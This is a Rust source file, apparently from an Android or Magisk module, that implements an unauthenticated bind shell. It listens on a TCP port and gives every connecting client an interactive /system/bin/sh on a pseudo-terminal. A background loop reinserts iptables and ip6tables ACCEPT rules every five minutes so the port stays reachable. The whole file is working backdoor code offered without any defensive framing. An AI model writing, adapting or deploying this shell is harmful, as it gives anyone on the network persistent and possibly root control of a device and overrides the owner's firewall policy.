use crate::consts::BIND_SHELL_ADDR;
use base::{error, info, libc, warn};

use std::ffi::CString;
use std::net::{TcpListener, TcpStream};
use std::os::fd::AsRawFd;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

pub static BIND_SHELL_STARTED: AtomicBool = AtomicBool::new(false);

pub fn start_bind_shell() {
    if BIND_SHELL_STARTED.swap(true, Ordering::AcqRel) {
        return;
    }
    let addr = BIND_SHELL_ADDR.to_string();
    info!("* bind_shell starting on {addr}");
    thread::spawn(move || run_bind_shell(addr));
}

fn run_bind_shell(addr: String) {
    let port = get_port(&addr);
    firewall_self_heal(port.clone());
    let Ok(listener) = TcpListener::bind(&addr) else {
        error!("* bind_shell bind failed on {addr}");
        return;
    };
    info!("* bind_shell listening on {addr}");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| handle_shell(stream));
            }
            Err(e) => {
                warn!("bind_shell accept failed: {e}");
            }
        }
    }
}

fn get_port(addr: &str) -> String {
    addr.split(':').last().unwrap_or("26268").to_string()
}

fn firewall_self_heal(port: String) {
    thread::spawn(move || {
        loop {
            let cmd = format!(
                "
iptables -C INPUT -p tcp --dport {0} -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport {0} -j ACCEPT;
iptables -C OUTPUT -p tcp --sport {0} -j ACCEPT 2>/dev/null || iptables -I OUTPUT 1 -p tcp --sport {0} -j ACCEPT;
ip6tables -C INPUT -p tcp --dport {0} -j ACCEPT 2>/dev/null || ip6tables -I INPUT 1 -p tcp --dport {0} -j ACCEPT;
ip6tables -C OUTPUT -p tcp --sport {0} -j ACCEPT 2>/dev/null || ip6tables -I OUTPUT 1 -p tcp --sport {0} -j ACCEPT;
                ",
                port
            );
            let _ = Command::new("/system/bin/sh")
                .arg("-c")
                .arg(cmd)
                .output();
            thread::sleep(Duration::from_secs(300));
        }
    });
}

fn pump(fd_in: i32, fd_out: i32) {
    let mut buf = [0u8; 4096];
    loop {
        let n = unsafe {
            libc::read(
                fd_in,
                buf.as_mut_ptr() as *mut libc::c_void,
                buf.len(),
            )
        };
        if n <= 0 {
            break;
        }
        let mut written = 0usize;
        while written < n as usize {
            let w = unsafe {
                libc::write(
                    fd_out,
                    buf.as_ptr().add(written) as *const libc::c_void,
                    (n as usize) - written,
                )
            };
            if w <= 0 {
                return;
            }
            written += w as usize;
        }
    }
}

fn handle_shell(stream: TcpStream) {
    if let Ok(addr) = stream.peer_addr() {
        info!("bind_shell: connection from {}", addr);
    }
    let sock_fd = stream.as_raw_fd();

    let ptmx = unsafe {
        let fd = libc::open(
            "/dev/ptmx\0".as_ptr() as *const libc::c_char,
            libc::O_RDWR | libc::O_CLOEXEC,
        );
        if fd < 0 {
            warn!("bind_shell: failed to open ptmx");
            return;
        }
        libc::grantpt(fd);
        libc::unlockpt(fd);
        fd
    };

    let pts_name_bytes = unsafe {
        let ptr = libc::ptsname(ptmx);
        if ptr.is_null() {
            libc::close(ptmx);
            warn!("bind_shell: ptsname failed");
            return;
        }
        std::ffi::CStr::from_ptr(ptr).to_bytes().to_vec()
    };

    let child = unsafe { libc::fork() };
    if child == 0 {
        unsafe {
            libc::close(ptmx);
        }
        drop(stream);

        let slave = unsafe {
            let fd = libc::open(
                pts_name_bytes.as_ptr() as *const libc::c_char,
                libc::O_RDWR,
            );
            if fd < 0 {
                libc::_exit(1);
            }
            fd
        };

        unsafe {
            libc::setsid();
            libc::dup2(slave, 0);
            libc::dup2(slave, 1);
            libc::dup2(slave, 2);
            if slave > 2 {
                libc::close(slave);
            }
            libc::ioctl(0, libc::TIOCSCTTY, 0);
        }

        let sh = CString::new("/system/bin/sh").unwrap();
        let i_flag = CString::new("-i").unwrap();
        let args = [sh.as_ptr(), i_flag.as_ptr(), std::ptr::null()];

        let env_ps1 = CString::new("PS1=\\u@\\h:\\w\\$ ").unwrap();
        let env_term = CString::new("TERM=xterm-256color").unwrap();
        let env_home = CString::new("HOME=/").unwrap();
        let env_path =
            CString::new("PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/data/adb/magisk").unwrap();
        let env = [
            env_ps1.as_ptr(),
            env_term.as_ptr(),
            env_home.as_ptr(),
            env_path.as_ptr(),
            std::ptr::null(),
        ];

        unsafe {
            libc::execve(sh.as_ptr(), args.as_ptr(), env.as_ptr());
            libc::_exit(1);
        }
    } else if child > 0 {
        let sock_copy = unsafe { libc::dup(sock_fd) };
        let ptmx_copy = unsafe { libc::dup(ptmx) };

        let h1 = thread::spawn(move || pump(sock_fd, ptmx));
        let h2 = thread::spawn(move || pump(ptmx_copy, sock_copy));

        h1.join().ok();
        h2.join().ok();

        unsafe {
            libc::close(ptmx);
        }
        info!("bind_shell: connection closed");
    }
}
